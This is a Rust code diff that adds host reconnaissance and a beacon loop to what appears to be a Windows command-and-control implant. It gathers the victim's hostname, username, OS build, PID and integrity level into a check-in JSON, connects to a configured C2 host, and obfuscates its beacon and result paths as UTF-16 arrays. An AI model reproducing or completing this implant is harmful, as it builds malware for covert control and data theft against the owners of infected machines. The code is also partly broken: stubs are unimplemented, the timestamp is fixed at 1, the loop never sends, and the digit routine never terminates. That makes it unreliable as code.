@@ -1,3 +1,6 @@
+use crate::core::net::json::JsonWriter;
+
+use crate::core::net::transport::HttpSession;
 use crate::debug;
 use crate::core::ssn_table;
 
@@ -57,8 +60,104 @@ unsafe fn get_current_pid() -> u32 {
     *pid_ptr as u32
 }
 
-unsafe fn gather_sysinfo() {
+unsafe fn get_rough_timestamp() -> i64 {
+    1
+}
+
+unsafe fn get_process_name_from_peb() -> String {
     unimplemented!()
+}
+
+unsafe fn query_integrity_level() ->  &'static str {
+    unimplemented!()
+}
+
+fn build_beacon_json(session_id: &str, info: &SysInfo) -> Vec<u8> {
+    let mut w = JsonWriter::new();
+    w.begin_object();
+    w.key_str("session_id", session_id);
+    w.key_str("hostname", &info.hostname);
+    w.key_str("username", &info.username);
+    w.key_str("os", &info.os_version);
+    w.key_u32("pid", info.pid);
+    w.key_str("process", &info.process_name);
+    w.key_str("arch", info.arch);
+    w.key_str("integrity", info.integrity);
+    // TODO: Use NtQuerySystemTime 
+    w.key_i64("timestamp", unsafe { get_rough_timestamp() });
+    w.key_object("metadata");
+    w.end_object(); // close metadata
+    w.end_object(); // close root
+    w.finish()
+}
+
+unsafe fn gather_sysinfo() -> SysInfo {
+    let table = ssn_table::syscall_table();
+
+    // Hostname using GetComputerNameExW (ComputerNameDnsHostname = 3)
+    let hostname = if !table.win32.get_computer_name_ex_w.is_null() {
+        type FnGetComputerNameExW = unsafe extern "system" fn (u32, *mut u16, *mut u32) -> i32;
+        let func: FnGetComputerNameExW = core::mem::transmute(table.win32.get_computer_name_ex_w);
+        let mut buf = [0u16; 64];
+        let mut size: u32 = 64;
+        if func(3, buf.as_mut_ptr(), &mut size) != 0 {
+            wide_to_string(&buf[..size as usize])
+        } else {
+            String::from("unknwon")
+        } 
+    } else {
+        String::from("unknwon")
+    };
+
+    // Username using GetUserNameW
+    let username = if !table.win32.get_user_name_w.is_null() {
+        type FnGetUserNameW = unsafe extern "system" fn (*mut u16, *mut u32) -> i32;
+        let func: FnGetUserNameW = core::mem::transmute(table.win32.get_user_name_w);
+        let mut buf = [0u16; 64];
+        let mut size: u32 = 64;
+        if func(buf.as_mut_ptr(), &mut size) != 0 && size > 1 {
+            wide_to_string(&buf[..size as usize - 1])
+        } else {
+            String::from("unknwon")
+        } 
+    } else {
+        String::from("unknwon")
+    };
+
+    // OS Version using RtlGetVersion
+    let os_version = {
+        let mut info = crate::core::types::OsVersionInfoExW {
+            os_version_info_size: core::mem::size_of::<crate::core::types::OsVersionInfoExW>() as u32,
+            major_version: 0,
+            minor_version: 0,
+            build_number: 0,
+            platform_id: 0,
+            csd_version: [0u16; 128],
+            service_pack_major: 0,
+            service_pack_minor: 0,
+            suite_mask: 0,
+            product_type: 0,
+            reserved: 0,
+        };
+        if !table.win32.rtl_get_version.is_null() {
+            crate::core::win32::rtl_get_version(&mut info);
+        }
+        let mut ver = String::from("Windows ");
+        append_32(&mut ver, info.major_version);
+        ver.push('.');
+        append_32(&mut ver, info.minor_version);
+        ver.push_str(" Build ");
+        append_32(&mut ver, info.build_number);    
+        ver
+    };
+
+    // PID from TEB
+    let pid = get_current_pid();
+
+    let process_name = get_process_name_from_peb();
+    let integrity = query_integrity_level();
+
+    SysInfo { hostname, username, os_version, pid, process_name, arch: "x64", integrity }
 }
 
 pub unsafe fn beacon_loop(config: &C2Config) {
@@ -76,8 +175,62 @@ pub unsafe fn beacon_loop(config: &C2Config) {
 
     let session = match HttpSession::new(config.host, config.port, config.use_https) {
         Some(s) => s,
-        None =>  return,
-    }
+        None =>  {
+            debug!("[BEACON] Failed to establish HTTP session");
+            return;
+        },
+    };
 
-    // TODO: Establish HTTP session
+    // Beacon paths
+    // /api/beacon
+    let beacon_path: [u16; 12] = [
+        0x002F, 0x0061, 0x0070, 0x0069, 0x002F, 0x0062, 0x0065,
+        0x0061, 0x0063, 0x006F, 0x006E, 0x0000,
+    ];
+    // /api/result
+    let result_path: [u16; 12] = [
+        0x002F, 0x0061, 0x0070, 0x0069, 0x002F, 0x0072, 0x0065,
+        0x0073, 0x0075, 0x006C, 0x0074, 0x0000,
+    ];
+
+    let mut interval = config.interval_ms;
+    let mut jitter = config.jitter_pct;
+
+    loop {
+        // Build beacon data
+        let beacon_json = build_beacon_json(&session_id, &sysinfo);
+        debug!("[BEACON] Checkin ({} bytes plaintext)", beacon_json.len());
+    }
+    unimplemented!()
 }
+
+fn wide_to_string(wide: &[u16]) -> String {
+    let mut s = String::with_capacity(wide.len());
+    for &c in wide {
+        if c == 0 { break; }
+        if c < 128 {
+            s.push(c as u8 as char);
+        } else {
+            s.push('?');
+        }
+    }
+    s
+}
+
+fn append_32(s: &mut String, mut val: u32) {
+    if val == 0 {
+        s.push('0');
+        return;
+    }
+    let mut digits = [0u8; 10];
+    let mut i = 0;
+    while val > 0 {
+        digits[i] = b'0' + (val % 10) as u8;
+        i += 1;
+    }
+    while i > 0 {
+        i -= 1;
+        s.push(digits[i] as char);
+    }
+}
+
